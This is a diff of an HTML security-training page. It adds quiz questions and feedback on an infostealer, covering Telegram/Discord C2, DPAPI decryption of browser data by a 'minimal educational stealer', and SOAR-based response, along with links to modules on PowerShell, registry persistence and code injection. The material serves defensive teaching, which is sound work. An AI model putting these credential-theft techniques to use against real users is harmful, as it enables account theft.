+            <div class="quiz-option" onclick="checkAnswer(this, true)">Telegram / Discord C2 panels</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false)">Cryptocurrency clipper modules</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false)">Rust-based stealers</div>
+            <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-container">
+            <h3>Question 7</h3>
+            <p>In the minimal educational stealer, why does DPAPI decryption work without injecting into the browser?</p>
+            <div class="quiz-option" onclick="checkAnswer(this, false)">Because DPAPI has no encryption</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true)">Because DPAPI keys are tied to the logged-in user, and the code runs as that user</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false)">Because the browser is not running</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false)">Because SQLite databases are unencrypted</div>
+            <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-container">
+            <h3>Question 8</h3>
+            <p>Which blue-team action directly counters the stealer's speed advantage?</p>
+            <div class="quiz-option" onclick="checkAnswer(this, false)">Waiting for the user to report suspicious behaviour</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true)">Automated SOAR playbooks that isolate the host and reset sessions</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false)">Collecting a memory dump after the weekend</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false)">Blocking only the hardcoded C2 IP</div>
+            <div class="quiz-feedback"></div>
+        </div>
+
         <h2>🔗 Cross-Links</h2>
         <p>This module connects directly to earlier training:</p>
         <div class="technique-grid">
             <div class="method-card">
                 <h4><a href="MODULE_03_POWERSHELL.html" class="cross-link">Module 03: PowerShell</a></h4>
                 <p>The delivery chain is built from PowerShell and VBScript primitives.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory</a></h4>
+                <p>Process memory layout and how code executes inside another process. Essential for understanding DLL injection.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_07_REGISTRY.html" class="cross-link">Module 07: Registry</a></h4>
+                <p>Windows registry structure, browser install paths, and persistence via Run keys.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_09_MALWARE.html" class="cross-link">Module 09: Malware</a></h4>
+                <p>Malware taxonomy, static vs dynamic analysis, and safe lab practices.</p>
             </div>
             <div class="method-card">
                 <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
@@ -1290,6 +1805,9 @@ detection:
             if (q.includes('Question 3')) return 'Static analysis found no registry Run-key persistence. The stealer focuses on extraction, not survival across reboots.';
             if (q.includes('Question 4')) return 'MAIN_URL is a hardcoded IP over HTTP, making the C2 traffic trivial to spot on the network.';
             if (q.includes('Question 5')) return 'Disconnecting stops exfiltration immediately. Then assume compromise and rotate credentials from a clean device.';
+            if (q.includes('Question 6')) return 'Telegram / Discord C2 panels use messenger bots and webhooks as free, low-maintenance exfiltration infrastructure.';
+            if (q.includes('Question 7')) return 'DPAPI encrypts data to the logged-in user. Code running as that user can ask Windows to decrypt it without browser injection.';
+            if (q.includes('Question 8')) return 'Stealers finish in seconds. Automated SOAR playbooks isolate hosts and reset sessions faster than human analysts can react.';
             return '';
         }
     </script>
